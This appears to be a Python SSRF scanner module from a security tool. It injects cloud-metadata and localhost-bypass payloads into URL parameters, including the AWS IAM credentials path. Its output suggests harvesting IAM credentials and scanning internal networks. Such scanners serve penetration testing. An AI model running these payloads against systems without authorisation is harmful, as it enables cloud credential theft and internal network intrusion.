"""Python-native SSRF (Server-Side Request Forgery) tester.

Detects endpoints that allow the server to make outbound HTTP requests
on behalf of an attacker by injecting SSRF payloads into URL query parameters:

1. Cloud metadata endpoint (169.254.169.254) — critical severity
2. Localhost loopback (127.0.0.1, ::1) — high severity
3. Named localhost — high severity

For each query parameter discovered in the target URL the tester replaces
its value with each payload and checks whether the response body contains
evidence that the server fetched the supplied URL.
"""

from __future__ import annotations

import json
import logging
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

logger = logging.getLogger("security_mcp.scanners.ssrf_tester")

# ---------------------------------------------------------------------------
# Payloads and detection keywords
# ---------------------------------------------------------------------------

_SSRF_PAYLOADS: list[str] = [
    # AWS IMDSv1 metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # GCP metadata (requires Metadata-Flavor header, but some proxies pass it)
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # DigitalOcean metadata
    "http://169.254.169.254/metadata/v1/",
    # Localhost probes
    "http://127.0.0.1/",
    "http://localhost/",
    # IPv6 localhost
    "http://[::1]/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    # Decimal IP bypass (127.0.0.1 = 2130706433)
    "http://2130706433/",
    # Octal IP bypass
    "http://0177.0.0.1/",
    # Hex IP bypass
    "http://0x7f000001/",
    # Shorthand localhost
    "http://0/",
    "http://127.1/",
]

_CLOUD_METADATA_KEYWORDS: list[str] = [
    "169.254.169.254",
    "ami-id",
    "instance-id",
    "iam",
    "meta-data",
    # GCP-specific
    "computeMetadata",
    "google.internal",
    "service-accounts",
    # Azure-specific
    "vmId",
    "subscriptionId",
    "resourceGroupName",
    # DigitalOcean-specific
    "droplet_id",
]

_SSRF_INDICATORS: list[str] = [
    "127.0.0.1",
    "localhost",
    "internal",
    "Connection refused",
    "ECONNREFUSED",
    "0.0.0.0",
    "::1",
    "root:x:0:0",
]

_SSRF_PARAM_NAMES: list[str] = [
    "url",
    "uri",
    "path",
    "dest",
    "redirect",
    "callback",
    "source",
    "img",
    "host",
    "feed",
    "file",
    "page",
    "doc",
    "href",
    "val",
    "domain",
    "site",
    "to",
    "out",
    "view",
]


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------


@dataclass
class SsrfVulnerability:
    """A single SSRF finding."""

    parameter: str
    payload: str
    evidence: str
    severity: str = "high"  # escalated to "critical" for cloud metadata
    confidence: float = 0.5


@dataclass
class SsrfResult:
    """Complete SSRF test result."""

    target: str
    vulnerable: bool = False
    vulnerabilities: list[SsrfVulnerability] = field(default_factory=list)
    duration_ms: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        """Serialise to JSON-friendly dict."""
        return {
            "target": self.target,
            "vulnerable": self.vulnerable,
            "vulnerabilities": [
                {
                    "parameter": v.parameter,
                    "payload": v.payload,
                    "evidence": v.evidence,
                    "severity": v.severity,
                    "confidence": v.confidence,
                }
                for v in self.vulnerabilities
            ],
            "duration_ms": round(self.duration_ms, 2),
            "summary": (
                f"SSRF confirmed ({', '.join(v.severity for v in self.vulnerabilities)})"
                if self.vulnerabilities
                else "No SSRF found"
            ),
            "next_steps": (
                ["Probe cloud metadata (169.254.169.254) for IAM credentials", "Scan internal network via SSRF"]
                if self.vulnerabilities
                else []
            ),
        }


# ---------------------------------------------------------------------------
# SSRF detection engine
# ---------------------------------------------------------------------------


class SsrfTester:
    """Multi-payload SSRF detector.

    Parameters
    ----------
    timeout:
        HTTP request timeout in seconds.
    """

    def __init__(self, timeout: float = 10.0) -> None:
        self.timeout = timeout

    # Maximum vulnerabilities to report per scan (prevents output explosion).
    MAX_VULNS = 10

    async def test(self, url: str, headers: dict[str, str] | None = None) -> SsrfResult:
        """Run SSRF tests against a target URL.

        For each query parameter found in *url*, replaces its value with
        each SSRF payload and inspects the response body for evidence that
        the server issued an outbound request to the supplied URL.

        Args:
            url: Target URL whose query parameters will be tested.
            headers: Optional HTTP headers to include in requests.

        Returns:
            ``SsrfResult`` with all discovered SSRF vulnerabilities.
        """
        start = time.monotonic()
        result = SsrfResult(target=url)

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            logger.debug("No query parameters found in %s — will try param injection", url)

        confirmed_params: set[str] = set()  # params already confirmed vulnerable

        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
            headers=headers or {},
        ) as client:
            # Strategy 1: test existing query parameters
            for param_name in params:
                if len(result.vulnerabilities) >= self.MAX_VULNS:
                    break
                if param_name in confirmed_params:
                    continue
                for payload in _SSRF_PAYLOADS:
                    vuln = await self._probe(client, url, parsed, params, param_name, payload)
                    if vuln:
                        result.vulnerabilities.append(vuln)
                        result.vulnerable = True
                        confirmed_params.add(param_name)
                        break  # one finding per param is sufficient

            # Strategy 2: inject known SSRF parameter names if none present
            existing_lower = {p.lower() for p in params}
            for ssrf_param in _SSRF_PARAM_NAMES:
                if len(result.vulnerabilities) >= self.MAX_VULNS:
                    break
                if ssrf_param.lower() in existing_lower or ssrf_param in confirmed_params:
                    continue
                for payload in _SSRF_PAYLOADS:
                    vuln = await self._probe_inject(client, url, parsed, params, ssrf_param, payload)
                    if vuln:
                        result.vulnerabilities.append(vuln)
                        result.vulnerable = True
                        confirmed_params.add(ssrf_param)
                        break  # one finding per param is sufficient

        result.duration_ms = (time.monotonic() - start) * 1000
        logger.info(
            "SSRF test complete: %s — %d vulns, %.0fms",
            url,
            len(result.vulnerabilities),
            result.duration_ms,
        )
        return result

    async def _probe(
        self,
        client: httpx.AsyncClient,
        original_url: str,
        parsed: Any,
        params: dict[str, list[str]],
        param_name: str,
        payload: str,
    ) -> SsrfVulnerability | None:
        """Replace one parameter value with *payload* and inspect the response."""
        # Build modified query string with the payload substituted
        modified_params = dict(params)
        modified_params[param_name] = [payload]
        new_query = urlencode(modified_params, doseq=True)
        modified_url = urlunparse(parsed._replace(query=new_query))

        try:
            resp = await client.get(modified_url)
        except httpx.HTTPError as exc:
            logger.debug("SSRF probe error (param=%s, payload=%s): %s", param_name, payload, exc)
            return None

        body = resp.text.lower()

        # Check for cloud metadata indicators first (higher severity)
        for keyword in _CLOUD_METADATA_KEYWORDS:
            if keyword.lower() in body:
                # Determine confidence: JSON content returned = 0.9, keyword match = 0.7
                try:
                    json.loads(resp.text)
                    cloud_confidence = 0.9
                except (json.JSONDecodeError, ValueError):
                    cloud_confidence = 0.7
                return SsrfVulnerability(
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Cloud metadata keyword '{keyword}' found in response body.",
                    severity="critical",
                    confidence=cloud_confidence,
                )

        # Check for general SSRF indicators
        for indicator in _SSRF_INDICATORS:
            if indicator.lower() in body:
                return SsrfVulnerability(
                    parameter=param_name,
                    payload=payload,
                    evidence=f"SSRF indicator '{indicator}' found in response body.",
                    severity="high",
                    confidence=0.5,
                )

        return None

    async def _probe_inject(
        self,
        client: httpx.AsyncClient,
        original_url: str,
        parsed: Any,
        params: dict[str, list[str]],
        param_name: str,
        payload: str,
    ) -> SsrfVulnerability | None:
        """Inject a new parameter with an SSRF payload and inspect the response."""
        injected_params = dict(params)
        injected_params[param_name] = [payload]
        new_query = urlencode(injected_params, doseq=True)
        modified_url = urlunparse(parsed._replace(query=new_query))

        try:
            resp = await client.get(modified_url)
        except httpx.HTTPError as exc:
            logger.debug("SSRF inject probe error (param=%s, payload=%s): %s", param_name, payload, exc)
            return None

        body = resp.text.lower()

        for keyword in _CLOUD_METADATA_KEYWORDS:
            if keyword.lower() in body:
                # Determine confidence: JSON content returned = 0.9, keyword match = 0.7
                try:
                    json.loads(resp.text)
                    cloud_confidence = 0.9
                except (json.JSONDecodeError, ValueError):
                    cloud_confidence = 0.7
                return SsrfVulnerability(
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Cloud metadata keyword '{keyword}' found after injecting param '{param_name}'.",
                    severity="critical",
                    confidence=cloud_confidence,
                )

        for indicator in _SSRF_INDICATORS:
            if indicator.lower() in body:
                return SsrfVulnerability(
                    parameter=param_name,
                    payload=payload,
                    evidence=f"SSRF indicator '{indicator}' found after injecting param '{param_name}'.",
                    severity="high",
                    confidence=0.5,
                )

        return None


# ---------------------------------------------------------------------------
# Tool wrapper for ToolRegistry
# ---------------------------------------------------------------------------


async def python_ssrf_test(url: str, headers: str | None = None) -> str:
    """Test a URL for SSRF (Server-Side Request Forgery) vulnerabilities.

    Injects SSRF payloads into URL query parameters and checks if the
    server fetches attacker-controlled URLs, exposing cloud metadata or
    internal services.

    Args:
        url: Target URL to test (must include query parameters to be effective).
        headers: Optional JSON-encoded dict of HTTP headers.

    Returns:
        JSON string with ``SsrfResult`` data.
    """
    import contextlib

    parsed_headers: dict[str, str] | None = None
    if headers:
        with contextlib.suppress(json.JSONDecodeError):
            parsed_headers = json.loads(headers)

    tester = SsrfTester()
    result = await tester.test(url, headers=parsed_headers)
    return json.dumps(result.to_dict(), indent=2)
